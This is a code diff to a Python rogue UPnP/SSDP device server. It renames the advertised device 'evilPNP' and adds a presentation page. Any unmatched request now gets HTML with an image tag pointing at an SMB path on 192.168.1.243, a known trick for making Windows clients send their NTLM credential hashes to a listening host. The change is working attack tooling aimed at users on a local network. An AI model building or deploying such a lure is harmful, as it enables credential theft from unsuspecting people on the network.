@@ -90,12 +90,17 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/xml')
             self.end_headers()
             self.wfile.write(xmlFile.encode())
-        if self.path == '/ssdp/service-desc.xml':
+        elif self.path == '/ssdp/service-desc.xml':
             xmlFile = self.buildServiceXml()
             self.send_response(200)
             self.send_header('Content-type', 'application/xml')
             self.end_headers()
             self.wfile.write(xmlFile.encode())
+        else:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write('<img src="file://///192.168.1.243/img.png">'.encode())
 
     def log_message(self, format, *args):
         address = self.address_string()
@@ -113,7 +118,7 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
     </specVersion>
     <device>
         <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
-        <friendlyName>ePNP</friendlyName>
+        <friendlyName>evilPNP</friendlyName>
         <manufacturer>eCorp</manufacturer>
         <manufacturerURL>http://ecorp.co</manufacturerURL>
         <modelDescription>eMedia Server</modelDescription>
@@ -132,16 +137,9 @@ class DeviceDescriptor(BaseHTTPRequestHandler):
                 <SCPDURL>/service-desc.xml</SCPDURL>
             </service>
         </serviceList>
-        <presentationURL>http://localhost</presentationURL>
-        <iconList><icon>
-            <mimetype>image/png</mimetype>
-            <width>93</width>
-            <height>45</height>
-            <depth>32</depth>
-            <url>http://172.40.30.94/icon.png</url>
-            </icon></iconList>
-    </device>
-    </root>'''.format(localIp, localPort)
+        <presentationURL>http://{}:{}/present.html</presentationURL>
+        </device>
+    </root>'''.format(localIp, localPort, localIp, localPort)
         return xmlFile
 
     def buildServiceXml(self):
